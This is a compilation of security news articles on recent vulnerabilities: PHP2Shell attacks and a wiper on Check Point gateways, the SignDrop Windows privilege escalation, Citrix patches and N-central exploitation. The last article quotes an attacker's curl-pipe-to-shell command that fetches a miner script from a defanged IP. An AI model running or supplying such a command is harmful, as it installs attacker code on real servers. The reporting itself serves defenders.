Vulnerabilities & Patching.title: Microsoft says November security updates cause printing issues
Vulnerabilities & Patching.context: Microsoft also addressed printing issues triggered by Windows updates in March and July 2025: the first caused USB printers to print random text, and the second broke the 'Print...
Vulnerabilities & Patching.full_text:
Microsoft warned customers earlier this week that the November 2026 security updates may break printing for documents with complex formatting.

As the company explained in a service alert seen by BleepingComputer, this known issue affects users attempting to print documents with images that have zero height or width on server (Windows Server 2016 or later) and client (Windows 10 or later) devices.

"After installing the November 2026 Windows security update (the Originating KBs listed above), or later updates, printing might fail for documents containing images rendered with a height or width value of zero at the selected printing resolution," Microsoft said.

"These images can be used as part of certain complex document formatting, such as adding "invisible" images intended to serve as a document watermark, layout anchoring, or generation tools that may inserting images objects even when no graphic present."

The bug mainly affects users printing Microsoft Word documents via the Windows Graphics Device Interface (GDI), but it may also trigger failures when printing from other applications.

Microsoft also addressed printing issues triggered by Windows updates in March and July 2025: the first caused USB printers to print random text, and the second broke the 'Print to PDF' feature.

More recently, the company notified customers that the August 2026 .NET Framework cumulative updates broke printing and PDF export in apps that use the Windows Presentation Foundation (WPF) UI framework.

This week, Microsoft also confirmed that this month's Patch Tuesday security updates trigger Windows activation and licensing failures with 0x80041008 error codes and that Windows updates released since the October Patch Tuesday cause SQL Server performance and stability issues.

Additionally, the company warned that the November 2026 Windows 11 security updates fail to install on systems with the October 2026 preview update.

Vulnerabilities & Patching.title: Unpatched Check Point Gateways Are Being Wiped exploiting PHP2Shell
Vulnerabilities & Patching.context: “Following initial access, the attacker escalated privileges from the portal service account to root by exploiting CVE-2026-123039, a local privilege-escalation vulnerability in...
Vulnerabilities & Patching.full_text:
Unpatched Check Point gateways were hacked worldwide, leading to root access, backdoors, network intrusion and destructive wiper attacks.

Starting on 30 October, an attacker scanned and exploited Check Point Security Gateways that hadn’t been patched, going in through the Mobile Access portal. Check Point Research describes the activity as PHP2Shell for initial access, followed by a root-level privilege escalation tracked as CVE-2026-123039. The activity began about a week after a fix became available, from an IP address ending in 130.94.19[.]204.

“We have now confirmed that, in late October 2026, approximately one week after a security fix became available, activity originating from 130.94.19[.]204 targeted Israeli organizations through vulnerable Mobile Access portals on Check Point Security Gateways. Evidence suggested some cases of a successful compromise, with exploitation activity consistent with PHP2Shell, associated with CVE-2026-109618 and CVE-2026-109619.” reads the report. “Following initial access, the attacker escalated privileges from the portal service account to root by exploiting CVE-2026-123039, a local privilege-escalation vulnerability in the DynamicCLI IPC interface. The attacker then used privileged command execution to deploy PHP webshells and establish persistence.”

There were two waves. The first, on 30 October, hit Israeli organizations, and some suffered destructive attacks. The second, on 2 November, reached organizations in several countries and sectors with no sign of destruction, and neither wave favored a particular sector. That points to opportunistic scanning, not careful targeting.

The first signs of the attack were PHP session files found in the /opt/CPcvpn-R81.20/tmp/ folder. These files contained a marker named upload_progress_pwn. The portal’s Apache and PHP processes also crashed hundreds of times, suggesting repeated attempts to exploit the vulnerability. The attacker then exploited another local flaw in the DynamicCLI interface to gain root privileges, giving them full control of the device.

With root access, the attackers installed PHP webshells in the folder used by the portal to create login pages. These files had names starting with zz and ending in .tpl. Initially, they contained simple tools for running commands. The attackers later replaced them with more advanced versions that required a hardcoded key, could execute system commands and PHP code, and supported file uploads. Uploaded files were first saved as /tmp/.up.tpl and then copied into the portal’s folder under the name challenge_render.tpl.

The attackers then installed a separate backdoor called TSGA, launched from /tmp/CPconfigdaemon. Running with root privileges, it moved itself, restarted under the name slot_CPconfigdaemon, and installed a second tool called TSProxy at /lib/libcpfwcommon.so. TSProxy was designed to run inside processes on the Check Point appliance and monitor network activity. It intercepted selected network connections used by the attackers while leaving normal network traffic unaffected.

TSGA is built for Check Point gear. It offers encrypted remote access, configuration theft, persistence through backups and snapshots, process injection and tampering with binary firewall logs. TSProxy adds encrypted proxying.

From the gateway, the attackers ran the gogo scanner to map the internal network, then moved over SSH to a VMware ESXi host using the vpxuser account. There they staged a Linux wiper, destroy_v6, and ran it. It deletes files in a target folder regardless of extension, overwrites them with zeros first unless run in fast mode, and can skip listed folders.

The wiper also leaves a note named DREAM_ANNEXATION.txt in each folder it processes. The note is politically themed, includes a timestamp, is written in Hebrew with reference to the Israeli-Palestinian conflict, and rejects ransom talks. At least nobody has to haggle.

Attribution is more difficult. TSGA and TSProxy appear to be modified versions of PhiliKit, a framework previously found in attacks against Ivanti devices and linked by ESET to UNC5221, a China-linked threat group. The tools share several unique features with PhiliKit, including code, configuration settings and encryption details. These similarities include the use of TCP port 11072 and a Unix socket at /tmp/.p_sock. TSProxy also uses the same credentials, communication secrets, TLS certificate and private key as a PhiliKit component called libdssafe.so.

Other findings also suggest a possible connection to Chinese threat actors. The gogo network scanner has previously been associated with China-linked groups, while the attackers used LightNode VPS servers, a hosting provider also used by these actors. The scanning activity took place between 00:00 and 09:00 UTC, corresponding to normal working hours in China (08:00 to 17:00).

However, some aspects of the operation do not match UNC5221’s known activity and objectives. These include the destructive attacks, the focus on Israeli organizations, the Hebrew-language message left by the wiper and the malware name, which appears to reference the word “Philistine”.

Check Point says several explanations are possible. UNC5221 may have carried out the entire operation, or it may have provided initial access to another threat actor. The attackers could also have deliberately left clues to mislead investigators. Another possibility is that the destructive attacks were intended to hide a different objective.

The note uses the Dream Security brand, and Dream recently published research on PHP2Shell attacks on Palo Alto Networks devices by China-nexus actors. That timing raises the possibility of retaliation, but the evidence doesn’t establish a clear motive.

“Taken together, the evidence does not allow us to assess with high confidence the true nature of this operation. Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation.” concludes the report. “It is also possible that the destructive activity served as a smoke screen.”

Follow me on Twitter: @securityaffairs and Facebook and Mastodon

Pierluigi Paganini

(SecurityAffairs – hacking, PHP2Shell)

Vulnerabilities & Patching.title: Check Point warns of zero-day flaw exploited for root access
Vulnerabilities & Patching.context: In a separate report, Check Point said the attackers first gained access to the Mobile Access portal by exploiting the PHP2Shell vulnerability, then escalated privileges to root...
Vulnerabilities & Patching.full_text:
Check Point Software has released emergency hotfixes to address a high-severity flaw that hackers have been exploiting to gain root privileges and establish persistence on vulnerable devices since late October.

Tracked as CVE-2026-123039, this local privilege escalation vulnerability was found in the DynamicCLI IPC (Inter-Process Communication) interface used to send privileged command requests to the root-level Gaia OS DynamicCLI (dynamic_server) daemon.

"Check Point observed an active exploit of this vulnerability against a couple of dozen customers," the company warned in a Thursday security advisory.

"The Gaia OS DynamicCLI daemon runs as root and listens on a world-writable local socket (/tmp/dynamic_socket) without authenticating connecting processes. An authenticated local user can send a command to the socket and have it executed as root."

The list of Check Point products vulnerable to attacks exploiting the CVE-2026-123039 flaw includes the company's Firewall, Multi-Domain Security Management Server, Scalable Platforms, Security Gateway, and Security Management Server.

In a separate report, Check Point said the attackers first gained access to the Mobile Access portal by exploiting the PHP2Shell vulnerability, then escalated privileges to root using CVE-2026-123039 zero-day exploits.

Next, the threat actors dropped webshells and installed TSGA backdoor and TSProxy malware that was previously spotted while investigating attacks targeting Ivanti appliances, then pivoted from the compromised gateway to a VMware ESXi host and deployed destructive wiper malware.

Check Point advised security teams who can't immediately deploy the CVE-2026-123039 hotfixes to stop the dynamic_server process and prevent it from restarting as a temporary mitigation measure.

The company also shared indicators of compromise (IOCs), and it said that customers can find evidence of compromise by checking for commands commonly associated with exploitation attempts, the use of the system() sink (uncommon or absent in legitimate traffic), and commands that don't use the default Clish wrapper (indicating that it was executed as root through the socket and requires further investigation).

In September, Check Point warned customers that attackers had been exploiting two other critical Security Management Server (CVE-2026-93616) and Security Gateway (CVE-2026-85102) remote code execution (RCE) vulnerabilities in zero-day attacks that didn't require privileges on the targeted systems.

Over the last two years, the US Cybersecurity and Infrastructure Security Agency (CISA) has added five Check Point flaws to its catalog of actively exploited vulnerabilities, two of which have also been abused by ransomware gangs.

Vulnerabilities & Patching.title: Citrix Patches 10 Critical NetScaler Vulnerabilities
Vulnerabilities & Patching.context: Citrix on Thursday announced patches for 28 vulnerabilities in NetScaler ADC and NetScaler Gateway, including nine critical-severity bugs
Vulnerabilities & Patching.full_text:
Citrix on Thursday announced patches for 28 vulnerabilities in NetScaler ADC and NetScaler Gateway, including nine critical-severity bugs.

The critical flaws stem from memory overflow issues in Packet Processing, SMPP traffic, DNS / DNS-over-HTTPS (DoH), NetScaler Push, Email OTP authentication, Endpoint Analysis (EPA/EPAS), and ICA proxy, and could lead to unpredictable/erroneous behavior or denial-of-service (DoS) conditions.

They are tracked as CVE-2026-120868, CVE-2026-107407 to CVE-2026-107410, CVE-2026-107412, CVE-2026-107415, CVE-2026-111334, and CVE-2026-120864.

Most of the remaining 19 security defects are high-severity weaknesses leading to similar outcomes. Citrix also patched several medium-severity bugs, including CVE-2026-111338, which exposes sensitive authentication material in a log file.

NetScaler ADC and Gateway versions 14.1-73.57 and later, 13.1-64.39 and later, 14.1-73.58 FIPS and later, and 13.1-FIPS and 13.1-NDcPP 13.1-37.293 and later contain the relevant patches.

Citrix urges customers to update their instances as soon as possible, and details CVE preconditions associated with some of the vulnerabilities.

Advertisement. Scroll to continue reading.

On Thursday, the company also announced patches for a critical-severity flaw in NetScaler Console. Tracked as CVE-2026-120869 (CVSS score of 9.4), it could allow unauthenticated attackers to bypass controls and access restricted resources.

The security defect impacts all NetScaler Console 14.1 releases before 14.1-74.34.

Citrix makes no mention of any of these vulnerabilities being exploited in the wild, but vulnerabilities in NetScaler are a frequent target for threat actors.

Vulnerabilities & Patching.title: OpenAI’s Daybreak brings AI agents to security testing and vulnerability fixes
Vulnerabilities & Patching.context: Red Team tests applications and verifies fixes Daybreak Red Team, offered through an early-access program, uses coordinated agents to examine application source code and...
Vulnerabilities & Patching.full_text:
OpenAI is bringing AI agents into more of the software security process with Daybreak, pairing web application penetration testing with tools that investigate vulnerabilities and develop fixes. The two offerings, Red Team and Defense Factory, connect the work of finding security weaknesses with patching and retesting them.

Red Team tests applications and verifies fixes

Daybreak Red Team, offered through an early-access program, uses coordinated agents to examine application source code and context, investigate potential attack paths and confirm vulnerabilities. It can validate findings from code scanners, bug bounty submissions and vulnerability disclosure reports, giving security teams evidence to help prioritize repairs.

Validate reported vulnerabilities (Source: OpenAI)

Once a patch is ready, Red Team can test whether it blocks the exploit. Assessments run within defined boundaries, using isolated environments and Guardian review to control which applications and endpoints agents can reach, according to OpenAI.

Defense Factory investigates vulnerabilities and prepares patches

Defense Factory handles the remediation side. Agents investigate findings from existing security tools or Red Team, trace vulnerabilities through the code and prepare proposed fixes. Engineers review and test patches before merging them, while Codex lets teams examine evidence, supply additional context and refine changes.

Put your existing security tools to work on fixes (Source: OpenAI)

Teams with access can install and enable the Daybreak Defense Factory (Preview) plugin in ChatGPT and connect a GitHub repository. Cloud scans run in Codex cloud, and each person starting a scan needs a personal GitHub connection. Scans can cover an entire repository’s default branch or selected folders and files.

Choose how to scan a repository (Source: OpenAI)

Teams can monitor new commits on the default branch, schedule recurring scans of that branch and enable security reviews of pull requests before changes merge. The desktop app also supports scans of local checkouts and uncommitted changes, with an optional Deep scan mode that makes multiple passes and uses additional time and tokens.

Download: The IT leader’s guide to AI code sprawl

Vulnerabilities & Patching.title: New SignDrop Exploit Can Abuse Windows Defender to Bypass Security Protections
Vulnerabilities & Patching.context: Chaotic Eclipse is a researcher known for publicly releasing PoC exploits for zero-day vulnerabilities, often after criticizing vendors’ handling of vulnerability reports
Vulnerabilities & Patching.full_text:
SignDrop is a Windows zero-day that abuses CLFS security protections to let local attackers gain SYSTEM privileges and bypass defenses.

The researcher Chaotic Eclipse, also known as INFINITE NIGHTMARE, MSNightmare, Nightmare-Eclipse, and MSNightmare, published a proof-of-concept for a new Windows local privilege escalation zero-day, naming it SignDrop. The flaw sits inside the mitigation Microsoft rolled out specifically to stop attacks on the Common Log File System (CLFS), and the researcher published the code and a technical breakdown on GitHub.

“This vulnerability won’t affect all windows machines but I guess estimate 80% of the world’s windows installations are vulnerable to this. To check, you need to run the proof of concept or check your registry configuration, if it spawns a SYSTEM shell, you’re vulnerable.” the expert wrote on GitHub. “And you’re generally vulnerable if your windows installation is older than 90 days so it’s safe to assume that everyone reading this is definitely vulnerable.”

CLFS parses complex log files in kernel mode, which made it an easy target for memory corruption bugs over the years. To curb that, Microsoft introduced a Common Log FileSystem (CLFS) authentication mitigation, rolled out to the public release channel starting October 28, 2025. The mitigation is introduced in two stages. For the first 90 days, the system runs in learning mode. After that, full protection is enabled, and CLFS requires every log file to have a valid authentication code.

The researcher says the vulnerability is caused by this staged rollout. The advisory estimates that about 80% of Windows installations worldwide may be affected because systems still in the 90-day learning period, or with the mitigation only partially enabled, remain vulnerable. Users can check their systems by looking at the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CLFS\Authentication\Mode registry key. A value of 0 or 1 means the system is vulnerable, while 2 or 3 means it is protected.

The bug lives in clfs.sys, specifically in how the driver creates the “.cnpf” authentication file tied to a new log container. CLFS does enforce access checks properly when a process creates its own log files, since it specifies OBJ_FORCE_ACCESS_CHECK so new objects stay under the calling process’s own context. The twist is what happens when a log file has an associated container: opening the original file also opens the one linked to it, and if that associated file is empty, CLFS will try to sign it whether or not a signature file already exists.

That behavior becomes dangerous the moment a different, more privileged process opens the file instead of the original caller. An attacker does not need special permissions to open a CLFS log file, only the correct file path. This allows a standard user to prepare a file and trick a process running with higher privileges into opening it. In this case, the researcher tricks Windows Defender into doing so by calling ServerMpUpdateEngineSignature and changing symbolic links in the Windows Object Manager. This makes Defender open the CLFS container from within its own antimalware engine.

Defender then follows the path stored in the original container to find the associated file. If the file has no signature, Defender creates one using SYSTEM privileges. CLFS then creates the new authentication file using the original file’s DACL, which defines who is allowed to access it.

“If everything is chained correctly, funnily this legit security mitigation can be used against itself and allow an elevation if privileges. Everything is done properly by Microsoft here but the logic allows abuse.” the researcher continues. “What makes it funnier is the fact that it can be used against any antimalware engine to bypass their self defense (or tamper protection) mechanism as you can trigger arbitrary file creation in the context of their own antimalware process so from the perspective of their kernel drivers, the file creation request is coming from their own legit process so it passes, this makes this vulnerability unique as it can be used to turn off any antivirus/EDR.”

The consequences reach beyond a single elevation of privilege trick because the same coercion can be pointed at any antimalware engine, not just Defender. The researcher pointed out that the driver’s file creation request appears to come from the antivirus’s own legitimate process, so it passes every check. That makes SignDrop usable to defeat self-defense and tamper-protection features across different security products, turning a shield into a door.

The researcher tested the proof-of-concept on Windows 11 26H2, Windows 11 26H2 Experimental, and Windows Server 2025 Experimental. There’s no workaround that doesn’t cost something: disabling the CLFS authentication mitigation removes the SignDrop path but brings back exposure to the memory corruption bugs the mitigation was built to stop in the first place.

“Unfortunately for now, disabling the mitigation will expose your machine to memory corruption vulnerabilities as CLFS still does not handle log files well, that’s why the mitigation exists in the first file so for now there is no solution to this except waiting for a patch to be released by Microsoft.” conclude the expert.

Chaotic Eclipse is a researcher known for publicly releasing PoC exploits for zero-day vulnerabilities, often after criticizing vendors’ handling of vulnerability reports. His releases have mainly targeted Microsoft products, including Windows and Microsoft Defender, with some later exploited in the wild. Among the most notable are the Undefend and RedSun Defender zero-days.

His work has fueled debate over responsible disclosure and the risks of publishing working exploits.

Recently, Chaotic Eclipse revealed that he is Abdelhamid Naceri, a security researcher. Naceri previously worked with Microsoft in the UK and Germany. In a now-deleted X post, he described his departure from the company, claiming Microsoft terminated his employment without giving him a clear reason. He said Microsoft offered several financial settlements, but he rejected them because he wanted a formal explanation and help staying in Germany.

Naceri also said he challenged the dismissal in a German labor court. According to his account, Microsoft changed its arguments during the case, but the court ultimately upheld the termination. He said the long legal dispute left him with almost no compensation and caused serious financial and emotional problems, including treatment in a psychiatric hospital.

The researcher also admitted that an earlier claim that Microsoft had taken legal action against him was fabricated. The claim came during the controversy over Microsoft’s threats of legal action against security researchers who disclosed zero-day vulnerabilities.

In September, Chaotic Eclipse released a zero-day exploit targeting Microsoft Defender. The researcher named the exploit BigDiskBuster, it triggers a Denial of Service Vulnerability in Windows Defender Update.

In September, Chaotic Eclipse also released multiple zero-day exploits targeting Nvidia (GreenSection) and Microsoft Defender (ShieldCrash).

The expert also released exploits targeting other anti-malware and defense solutions. He released a zero-day exploit targeting Kaspersky Endpoint Security he named HardBreacher, which triggers a privilege escalation flaw. The researcher pointed out that the PoC is unstable and may require repeated attempts, but when successful, it creates a DLL in System32 with full user permissions. The researcher also claims taking control of Kaspersky’s UI process can disrupt the antivirus and interfere with file-access controls, potentially leaving the system in an unstable state.

The researcher also released a zero-day exploit named PrettyPrague targeting GenDigital Avast Antivirus. The exploit triggers a privilege escalation flaw.

Finally, Chaotic Eclipse released a new zero-day exploit targeting Crowdstrike Falcon cybersecurity platform. The researcher named the exploit FalconFlank, it triggers a privilege escalation flaw.

Follow me on Twitter: @securityaffairs and Facebook and Mastodon

Pierluigi Paganini

(SecurityAffairs – SignDrop, Chaotic Eclipse)

Vulnerabilities & Patching.title: Nightmare Eclipse Drops Windows Zero-Day Exploit ‘SignDrop’
Vulnerabilities & Patching.context: Security researcher Abdelhamid Naceri, known online as Nightmare Eclipse, this week dropped another zero-day exploit targeting Windows systems
Vulnerabilities & Patching.full_text:
Security researcher Abdelhamid Naceri, known online as Nightmare Eclipse, this week dropped another zero-day exploit targeting Windows systems.

Dubbed SignDrop, the exploit allows a local user to elevate their privileges to System by abusing flawed logic in the Windows Common Log File System (CLFS).

CLFS parses complex log files in kernel mode and has long been an attractive target for threat actors. Last year, Microsoft introduced CLFS logfile authentication to mitigate exploitation, which relies on authentication codes to check file integrity.

SignDrop, Naceri says, exploits a vulnerability in how clfs.sys handles the creation of the authentication file ‘.cnpf’ during the creation of a log file.

The code responsible for creating/opening both container and log files will always open the container if the original log file is opened. If the container is empty, CLFS attempts to sign it regardless of whether the signature file exists.

A standard user can create a log file and specify a path to an associated container in it, and then coerce Windows Defender to open the file in the context of the antimalware engine by calling the signature update RPC interface.

Advertisement. Scroll to continue reading.

This leads Defender to use the file path specified in the container to open the associated log file. If absent, a signature file is then created with System privileges.

SecurityWeek has not tested SignDrop, but understands that the proof-of-concept (PoC) code abuses the mechanism to create a signature file at an attacker-controlled location and then reopens the file to place a payload in it, resulting in the spawning of a System shell.

According to the security researcher, SignDrop has been tested on Windows 11 26H2, Windows 11 26H2 Experimental, and Windows Server 2025 Experimental, and should work on 80% of the world’s Windows installations.

“You’re generally vulnerable if your Windows installation is older than 90 days,” Naceri says.

According to cybersecurity services provider Cyderes, which successfully compiled and tested the PoC exploit, there is no evidence that the zero-day has been exploited in the wild.

SecurityWeek has emailed Microsoft for a statement on SignDrop and will update this article if the company responds.

Vulnerabilities & Patching.title: Hackers Exploit PHP2Shell Flaws in Check Point Gateways to Deploy TSGA Backdoor and Wipe ESXi Files
Vulnerabilities & Patching.context: "The issue is a local privilege escalation and requires the attacker to already have local code execution on the appliance," Check Point said, adding it "observed an active...
Vulnerabilities & Patching.full_text:
An unknown threat actor has been observed targeting unpatched Check Point Security Gateways to obtain initial access via the PHP2Shell vulnerabilities and then a previously unreported local privilege escalation flaw in Gaia OS to deploy a backdoor called TSGA.

The activity, detailed by Check Point, began on October 30, 2026, and targeted Israeli organizations, with a broader follow-up wave on November 2, 2026, that targeted organizations across multiple countries and sectors. Some of the organizations singled out in the first wave have also been at the receiving end of destructive actions that include the deployment of wiper malware.

"PHP2Shell provided initial access, followed by privilege escalation through the DynamicCLI interface, tracked as CVE-2026-123039," Check Point said. "The attackers then deployed PHP web shells, the persistent TSGA backdoor, and its embedded TSProxy networking component."

"The attackers pivoted from the gateway to a VMware ESXi host over SSH, deployed the destroy_v6 wiper, and left politically themed DREAM_ANNEXATION.txt notes during the destructive stage."

CVE-2026-123039 (CVSS score: 7.8) is a missing authorization flaw that could enable privilege escalation to root in the DynamicCLI process, enabling any authenticated local user to run arbitrary commands by writing a single request to the socket.

"The issue is a local privilege escalation and requires the attacker to already have local code execution on the appliance," Check Point said, adding it "observed an active exploit of this vulnerability against a couple of dozen customers."

The issue impacts versions R82.20, R82.10, R82, R81.20, R81.10, and R81 of the following products -

Check Point Force Firewalls

Check Point Management and Log Servers

Multi-Domain Security Management and Multi-Domain Log Server

Maestro Orchestrator

"In late October 2026, approximately one week after a security fix became available, activity originating from 130.94.19[.]204 targeted Israeli organizations through vulnerable Mobile Access portals on Check Point Security Gateways," Check Point said.

"Evidence suggested some cases of a successful compromise, with exploitation activity consistent with PHP2Shell, associated with CVE-2026-109618 and CVE-2026-109619."

After obtaining initial access, the unknown hacking group is said to have escalated privileges from the portal service account to root by weaponizing CVE-2026-123039 and deploying PHP web shells with an aim to establish persistent access. The web shells support command execution and file upload capabilities.

The November 2, 2026, wave is said to have targeted some Israeli organizations that had already been targeted in the first wave, alongside other organizations worldwide, without demonstrating any specific geographic or sector preference, indicating an opportunistic initial-access effort.

The access afforded by the web shell paves the way for TSGA, a standalone passive backdoor that also includes a second component called TSProxy. TSGA, deployed as slot_CPconfigdaemon, has been described as a Linux gateway implant with Check Point-specific functionality, offering encrypted remote access, configuration theft, backup and snapshot persistence, process injection, and binary firewall-log tampering.

"[TSProxy's] injection code loads this library into selected appliance processes, where it intercepts networking functions to handle specially marked attacker connections while allowing ordinary traffic to continue," Check Point said. "This combines a persistent standalone backdoor with concealed access through existing appliance services."

Some of the other post-exploitation actions observed are listed below -

Deploying the gogo scanner on the gateway to discover internal assets and services across the network.

Moving laterally to a VMware ESXi host over SSH by authenticating with the vpxuser service account.

Staging a Linux ELF wiper called destroy_v6 and executing it. The malware recursively traverses the target directory and deletes all files regardless of their extension. It also attempts to overwrite files with zeros before deleting them.

Dropping a note named "DREAM_ANNEXATION.txt" in each processed directory.

Both TSGA and TSProxy are assessed to be Check Point-specific components of a toolkit dubbed PhiliKit that was first documented by ESET in June 2026, attributing it to a China-nexus cyber espionage group tracked as Armory Castle (formerly UNC5221).

Other factors that point to the involvement of a possible China-aligned threat actor include the use of LightNode VPS infrastructure and the fact that scanning activity was concentrated between 12 and 9 a.m. UTC, coinciding with typical Chinese working hours.

However, the cybersecurity company said it does not have enough evidence to link the latest campaign to the threat actor or other known Chinese-nexus groups, citing the following reasons -

Use of wiper malware

Focus on Israel and explicit references to the Israeli-Palestine conflict in the wiper note

"Taken together, the evidence does not allow us to assess with high confidence the true nature of this operation," Check Point said. "Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation. It is also possible that the destructive activity served as a smoke screen."

Vulnerabilities & Patching.title: PHP2Shell Exploited in Destructive Check Point Gateway Attacks
Vulnerabilities & Patching.context: Threat actors have been exploiting PHP2Shell vulnerabilities to hack Check Point Gateway appliances and deploy a wiper against victim organizations, Check Point reports
Vulnerabilities & Patching.full_text:
Threat actors have been exploiting PHP2Shell vulnerabilities to hack Check Point Gateway appliances and deploy a wiper against victim organizations, Check Point reports.

The attacks unfolded in two waves. An initial, destructive round started on October 30 and targeted Israeli organizations, and a second one started on November 2, targeting organizations across multiple countries.

PHP2Shell, tracked as CVE-2026-109618 and CVE-2026-109619, refers to two critical vulnerabilities leading to remote code execution (RCE) and affecting all PHP versions from PHP 5 onwards. They were patched on October 21, but exploitation started days before patches and mass exploitation shortly after.

Dream has linked attacks targeting PHP2Shell to root Palo Alto Networks firewalls to Chinese hackers, and the hackers targeting Check Point gateways have left a note mentioning the cybersecurity firm.

As part of the Check Point campaign, the attackers exploited PHP2Shell for initial access, then targeted CVE-2026-123039, a local privilege escalation in the DynamicCLI process, to gain root access and deploy PHP webshells and establish persistence.

In late October, the attackers targeted Check Point Mobile Access gateways across multiple Israeli organizations. They placed PHP webshells in a directory the Mobile Access portal uses to construct login pages, allowing them to send commands and establish a stronger foothold on the environment.

Advertisement. Scroll to continue reading.

Next, they deployed TSGA and TSProxy, variants of the malware framework PhiliKit previously seen (PDF) in China-linked UNC5221’s hacking into Ivanti products, for backdoor access and network function interception.

The attackers followed up with internal asset discovery, then moved laterally to a VMware ESXi host where they deployed and executed a wiper, and then deployed a note mentioning Dream Security.

According to Check Point, the hackers operated during typical Chinese working hours. Despite this and the use of China-linked malware and infrastructure, the use of a wiper and the destructive nature of the attacks do not align with known Chinese cyber operations.

“Taken together, the evidence does not allow us to assess with high confidence the true nature of this operation. Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation. It is also possible that the destructive activity served as a smoke screen,” Check Point says.

The second wave targeted Check Point Security Gateways across organizations worldwide, including some Israeli entities targeted in the first wave. No destructive activity was observed during this second wave.

“Neither wave showed a clear sector preference, suggesting opportunistic initial-access attempts rather than sector-specific targeting,” Check Point notes.

Vulnerabilities & Patching.title: Hackers Exploit New N-central Zero-Day Hours After PoC Publication
Vulnerabilities & Patching.context: Threat actors started exploiting a new zero-day vulnerability in N-able N-central hours after a disgruntled security researcher released it publicly
Vulnerabilities & Patching.full_text:
Threat actors started exploiting a new zero-day vulnerability in N-able N-central hours after a disgruntled security researcher released it publicly.

Dubbed 4EverAble2Shell, the security defect could allow unauthenticated attackers to gain remote code execution (RCE) with root privileges on N-central servers running the latest patches.

The zero-day was dropped on GitHub by security researcher Sean Bales two days after N-able rolled out fixes for several other unpatched flaws he released publicly over the weekend.

4EverAble2Shell, Bales says, chains an exploit for a recent Apache Axis vulnerability (CVE-2026-90436, CVSS score: 9.8) with an exploit for an unspecified security hole in N-central deployments that have Legacy API enabled.

The exploit chain targets the Axis bug to achieve RCE, and then attempts to elevate privileges to root and run a shell script.

According to Bales, the exploit chain works against N-central servers that have been updated this week to 2026.4 HF2 (build number 2026.4.1.26), which contains fixes for the previously released Able2Shell zero-days.

Advertisement. Scroll to continue reading.

N-able reacted immediately to the new zero-days and restricted certain N-central features and integrations, including Legacy API and Intune integration.

“Through our ongoing investigation today, we have identified additional indicators of compromise (IoCs) and are working closely with those specific customers to assess and mitigate any potential risks,” N-able said on November 13.

On November 12, Bales published proof-of-concept (PoC) exploit code for 4EverAble2Shell and Agent2Shell, a set of roughly a dozen zero-day flaws that could allow attackers to execute commands on managed Windows agents with System privileges.

4EverAble2Shell exploited within hours

Threat actors started using the 4EverAble2Shell PoC in attacks hours after it landed, early-warning threat intelligence platform Previdian (formerly KEVIntel) said.

“New N-able zero-days are out, and WatchTowr Intel is already seeing probes for ‘4EverAble2Shell’, which affects builds with the Legacy API enabled,” preemptive attack surface management firm WatchTowr warned.

Lupovis and Huntback observed attackers successfully compromising N-central servers roughly 5 hours after the PoC publication. They deployed an XMRig miner with systemd or cron persistence.

“Each victim’s miner is named after its IP address,” Lupovis told SecurityWeek, explaining that the attacker’s wallet showed 21 rigs linked to compromised N-central servers in the US (9), South Africa (4), Canada (4), the UK, Germany, France and Sweden.

“Our decoys never execute anything, so none of the listed rigs are ours. Every one is a real server that ran the chain to root,” Lupovis said.

In a technical write-up, Huntback notes that 19 of the victims had applied the latest patches from N-able.

“The miner is the only payload we have seen, but the escalation hands the operator root on a host that manages your customers’ endpoints. Treat a hit as a full compromise, not a cleanup job. Applying Hotfix 2 is not enough on its own,” Huntaback says.

Vulnerabilities & Patching.title: Hackers Exploit N-central Flaws to Infect 21 Servers, Including 19 Running Hotfix 2
Vulnerabilities & Patching.context: The attacks have been found to string together a critical Apache Axis vulnerability, tracked as CVE-2026-90436 (CVSS score: 9
Vulnerabilities & Patching.full_text:
N-able on Thursday said it's taking additional precautions in the wake of public disclosure of a new set of flaws tracked as 4EverAble2Shell and Agent2Shell.

"We are restricting certain N-central features and integrations," the company said in a Thursday update. "These measures may affect some functionality, but we believe taking additional precautions while remediation is completed is the right action to protect our partners and their customers."

The following actions have been applied to Hosted environments -

Legacy API is turned off by default in the product.

Intune integration has been turned off while additional protections are implemented and validated.

Hosted customers are also being recommended to follow N-able's previous guidance to upgrade Agents and Probes on N-central version 2026.4 HF1 and above, as the update introduces changes in how the Probe and Agent communicate.

"N-able N-central 2026.4 HF1 updates legacy components of the Agent and Probe, which changes how the two communicate," it said. "As such, upgrading both Agents and Probes in your N-central server is a MUST to ensure all managed devices are communicating and patched."

On-premises customers are being urged to upgrade Agents and Probes and ensure Legacy API access is disabled in the environment, if it has been previously turned on.

"Our teams are actively assessing the new disclosures, developing additional remediation, and working to safely restore affected functionality," N-able said. "Protecting our partners and their customers remains our highest priority, and we will continue to take precautionary action where necessary."

The development comes as independent security researcher Sean Bales disclosed two new sets of flaws called 4EverAble2Shell and Agent2Shell that work against the latest version of N-central and can allow attackers to execute arbitrary code as root and gain SYSTEM-level access to Windows systems under specific conditions.

Multiple threat intelligence reports show that 4EverAble2Shell has moved beyond preliminary probing to active exploitation efforts, with threat actors leveraging it to deploy cryptocurrency miners on vulnerable servers.

The attacks have been found to string together a critical Apache Axis vulnerability, tracked as CVE-2026-90436 (CVSS score: 9.8), with a separate N-central privilege escalation weakness to obtain root-level access.

"An unauthenticated exploit chain in N-able N-central, disclosed as 4EverAble2Shell, is reported to allow remote attackers to execute arbitrary operating-system commands with root privileges," Previdian, which is tracking the flaw as VULN-2026-0009, said.

"The chain exploits unsafe class instantiation during SOAP fault processing in the bundled Apache Axis component. A crafted request causes an attacker-selected JLine class to process malicious input, resulting in command execution as the nable service account."

In an exploit chain detailed by the threat intelligence company, threat actors have been observed attempting to download and execute a shell script ("jup.sh") from an attacker-controlled server at "157.20.241[.]16," while sending back diagnostic information and command output to the server.

Cybersecurity company Huntback has also revealed that the same IP address is weaponizing the 4EverAble2Shell flaw, deploying an XMRig Monero cryptocurrency miner on 21 N-central servers via the aforementioned shell script -

mount -o remount,exec /tmp 2>/dev/null; curl -fsSL hxxp://157.20.241[.]16:8080/jup.sh | sh -s nc_[target-IP-redacted]

The miner is designed to use only half of the available CPU cores, likely in an effort to fly under the radar. The compromised N-central servers are concentrated across the U.S., South Africa, Canada, the U.K., Germany, France, and Sweden.

